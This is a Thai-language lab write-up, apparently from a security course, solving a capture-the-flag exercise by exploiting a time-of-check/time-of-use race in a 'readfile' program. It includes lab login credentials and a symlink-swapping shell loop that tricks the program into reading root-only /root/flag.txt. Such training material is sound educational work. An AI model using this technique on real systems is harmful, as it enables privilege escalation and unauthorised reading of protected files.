# Race Condition#1

**Solution**

1. เมื่อทำการ start lab แล้ว ให้เข้าไปที่เครื่องโดยใช้ http ตาม URL ที่ระบุไว้ จากนั้นให้ใส่ username เป็น `noob`, password เป็น **`N00bP@ssw0rd`**

2. เมื่อ login ได้สำเร็จจะพบว่าเราเป็น user noob ซึ่งเป็น user ธรรมดา (ตรวจสอบได้จากการใช้คำสั่ง `id`)

![course-6-201905145458Nv9LFy3F3FnC.png](https://media.mooc.ncsa.or.th/courses/1/course-6-201905145458Nv9LFy3F3FnC.png)

และภายใน home directory ของ user noob นั้นจะมีไฟล์อยู่ด้วยกัน 2 ไฟล์คือ readfile และ readfile.c นั่นเอง

![course-6-201905145458SqpCyXCSqbXJ.png](https://media.mooc.ncsa.or.th/courses/1/course-6-201905145458SqpCyXCSqbXJ.png)

ซึ่ง readfile.c จะมี source code ตามที่โจทย์บอกไว้ในตอนแรก

3. ทดสอบใช้งาน readfile เพื่ออ่านไฟล์ /etc/passwd จะได้ผลเป็น

![course-6-20190514545835Q5W8QyvAnc.png](https://media.mooc.ncsa.or.th/courses/1/course-6-20190514545835Q5W8QyvAnc.png)

แต่เมื่อเราจะใช้อ่านไฟล์ /root/flag.txt จะไม่สามารถอ่านได้

![course-6-201905145458VIMIgxQ72Uic.png](https://media.mooc.ncsa.or.th/courses/1/course-6-201905145458VIMIgxQ72Uic.png)

ย้อนกลับไปทำความเข้าใจ source code ในส่วนบรรทัดที่ประมาณ 29-30 เขียนว่า

```c
if(access(argv[1], R_OK) == 0) {
     for (i=0; i<100000; i++) { j = (j*i) % 1000; }  // WASTE SOME TIME
```

เราจะเห็นว่าตัวไฟล์มีการเช็คว่าตัว user มีสิทธิ์อ่านไฟล์หรือไม่ใน if(access(argv[1], R_OK) == 0) ซึ่งถ้าไม่ได้ก็จะขึ้นเป็น “You don’t have access to %s” และหากผ่านไปได้ก็จะมี loop หน่วงเวลาที่ทำให้เกิดช่องโหว่ จากนั้นมันถึงจะเข้าไปอ่านไฟล์นั้นๆต่ออีกที

4. ทีนี้ให้เราทำ Soft link ขึ้นมาโดยใช้คำสั่งเป็น (เปลี่ยนจากคำว่า link เป็นอะไรก็ได้นะครับ)

```
ln -s /etc/passwd link
```

คำสั่งนี้จะหมายถึงการสร้าง file ที่จะ link ไปยังไฟล์ `/etc/passwd` นั่นเอง จากนั้นทดสอบอ่านไฟล์ `/etc/passwd` อีกที แต่คราวนี้เปลี่ยนเป็นการอ่านผ่านไฟล์ link จะได้เป็น

![course-6-201905145458xK2YcLLtAb2z.png](https://media.mooc.ncsa.or.th/courses/1/course-6-201905145458xK2YcLLtAb2z.png)

5. ทีนี้ให้ลองสร้าง link อีกทีแต่ไปยัง `/root/flag.txt` จะพบว่าไม่ได้

```
ln -s /root/flag.txt link
```

จะพบว่าสร้างไม่ได้เพราะมีไฟล์ link ที่เราสร้างในขั้นตอนอยู่แล้วนั่นเอง ดังนั้นเราจะบังคับสร้างโดยกำหนด option “force” เข้าไปด้วยก็จะกลายเป็น

```
ln -sfT secret link
```

![course-6-201905145458riTQLLOHbwql.png](https://media.mooc.ncsa.or.th/courses/1/course-6-201905145458riTQLLOHbwql.png)

ทีนี้เราจะทราบและระบุเป้าหมายการอ่านไฟล์นั้นเป็นชื่อเดียวกันได้นั่นคือ link โดยเราจะสร้างการโจมตี race condition โดยการที่ปล่อยให้ readfile นั้นอ่าน link ไฟล์ที่ถูกโยงไปยัง `/etc/passwd` ก่อน แต่ในช่วงเวลาที่เกิด delay ในบรรทัดที่ 30 นั้น เราจะทำการเปลี่ยนการโยงไปยัง `/root/flag.txt` แทน ซึ่งก็จะทำให้สามารถ bypass การตรวจสอบสิทธิ์ของ user ในบรรทัดที่ 29 ไปได้นั่นเอง ซึ่งแน่นอนว่าจากการทดสอบรันไปก่อนหน้า เราจะพบว่าเรามีเวลาแค่ประมาณ 1000 microsec เท่านั้นที่จะสลับ link ไปมาระหว่าง `/etc/passwd` กับ `/root/flag.txt`

6. ทำการสร้าง process ในการเปลี่ยนสลับไปมาของ link ในการโยงระหว่าง `/etc/passwd` และ `/root/flag.txt` โดยใช้คำสั่ง for loop แล้วรัน เป็น backgroud ไว้

```
for i in {1..10000}; do ln -sfT /root/flag.txt link; ln -sfT /etc/passwd link; done
```

7. จากนั้นให้เราทำการรัน

```
./readfile link
```

อีกที ไปเรื่อยๆจะพบว่ามันจะมีบางครั้งที่เราสามารถอ่านไฟล์ `/root/flag.txt` ได้ สืบเนื่องจากมันมีการเปลี่ยนไปมาระหว่าง `/etc/passwd` และ `/root/flag.txt` ได้ถูกเวลานั่นเอง

![course-6-2019051454586KZ8bOb5eojQ.png](https://media.mooc.ncsa.or.th/courses/1/course-6-2019051454586KZ8bOb5eojQ.png)